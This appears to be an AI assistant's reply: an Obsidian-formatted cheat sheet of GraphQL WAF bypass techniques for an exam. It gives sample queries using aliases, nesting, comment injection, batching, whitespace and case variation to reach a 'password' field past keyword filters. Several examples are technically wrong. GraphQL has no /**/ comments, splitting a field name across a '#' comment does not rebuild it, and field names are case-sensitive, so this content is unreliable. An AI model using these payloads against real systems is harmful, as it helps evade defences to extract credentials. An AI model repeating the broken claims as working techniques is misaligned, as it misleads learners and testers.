Here is the **expanded GraphQL WAF Bypass Cheat Sheet**, including multiple bypass techniques — professionally formatted for **Obsidian**, with **no emojis** and **clear context**.

---

# GraphQL WAF Bypass Techniques

> [!info] Objective  
> These techniques help bypass weak Web Application Firewalls (WAFs) that rely on keyword-based filtering, basic string matching, or shallow request inspection.

---

## 1. Aliases

> [!tip] Purpose  
> Rename sensitive field names to avoid WAF detection and simplify response parsing.

### Example

```graphql
query {
  a: password
  b: email
}
```

### Why It Works

- WAFs may block `"password"` but not recognize `a: password` unless they deeply inspect the query structure (AST-level inspection).
    

---

## 2. Nested Queries

> [!tip] Purpose  
> Hide sensitive field names inside nested objects or relationships.

### Example

```graphql
query {
  user {
    credentials {
      password
    }
  }
}
```

### Why It Works

- Shallow WAFs scanning only top-level fields (e.g., `user`) might miss nested values like `password`.
    

---

## 3. Comment Injection

> [!tip] Purpose  
> Break up keywords using comments to bypass WAF keyword matching.

### Example

```graphql
query {
  # comment
  pass#injection
  word
}
```

Or break a word inline:

```graphql
query {
  pass/**/word
}
```

### Why It Works

- WAFs that scan for `"password"` as a single string may miss it when broken by comments or formatting.
    

---

## 4. Query Batching

> [!tip] Purpose  
> Send multiple queries in a single request to mask intent or confuse filtering mechanisms.

### Example (batched JSON request)

```json
[
  { "query": "{ ping }" },
  { "query": "{ password }" }
]
```

### Why It Works

- WAFs expecting a single query per request may not handle JSON arrays properly.
    

---

## 5. Query Obfuscation via Whitespace or Reformatting

> [!tip] Purpose  
> Alter syntax layout to break naive WAF rules.

### Examples

```graphql
query
{
  password
}
```

Or with extra spacing:

```graphql
query      {      password       }
```

### Why It Works

- Keyword detection based on fixed patterns may fail when the structure is altered.
    

---

## 6. Case Variation

> [!tip] Purpose  
> Use different capitalization if WAF is case-sensitive.

### Example

```graphql
query {
  PassWord
}
```

### Why It Works

- Some WAFs do not normalize case before filtering.
    

---

## 7. Field Aliasing with Nested Obfuscation

> [!tip] Purpose  
> Combine multiple bypass techniques for stronger evasion.

### Example

```graphql
query {
  a: user {
    b: credentials {
      c: password
    }
  }
}
```

---

# Detection Tips

> [!warning] Signs You're Behind a WAF
> 
> - 403/406 status codes on otherwise valid queries
>     
> - Blocked only when using certain keywords
>     
> - Queries succeed when aliased or restructured
>     
> - No GraphQL-specific error messages (generic HTTP errors instead)
>     

---

# Notes

- These techniques are not effective against WAFs that inspect GraphQL ASTs.
    
- Combine multiple techniques when needed.
    
- Always verify functionality with both direct and obfuscated queries.
    

---

Let me know if you’d like a printable or summarized version of this for rapid exam use.